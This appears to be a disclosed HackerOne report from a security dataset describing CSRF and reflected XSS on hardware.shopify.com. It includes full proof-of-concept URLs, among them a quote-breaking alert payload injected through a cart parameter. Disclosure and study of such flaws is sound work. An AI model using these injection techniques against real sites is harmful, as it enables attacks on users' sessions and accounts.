---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '116006'
original_report_id: '116006'
title: XSS on hardware.shopify.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2016-02-11T22:24:58.916Z'
disclosed_at: '2016-03-01T06:18:34.752Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on hardware.shopify.com

## Metadata

- HackerOne Report ID: 116006
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2016-03-01T06:18:34.752Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello @Shopify.
I found CSRF and XSS, that very good combine with each other.
### CSRF
This CSRF is not dangerous, but is serves me in order to perform other bugs.
For example, here CSRF for adding product:
```
http://hardware.shopify.com/cart/add?&id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885&properties[master_builder]=1&properties[test]=test&properties[value]=11&add
```
Works with GET and POST requests, which greatly simplifies the work.
### XSS
To reproduce this XSS, visit this link:
```
http://hardware.shopify.com/cart/add?id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS&properties[master_builder]=1&properties[test]=test&properties[value]=11&add
```
And click "Remove" in attached product.
Vulnerable parameter: `properties[builder_id]`
For this XSS i used `');alert('XSS`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
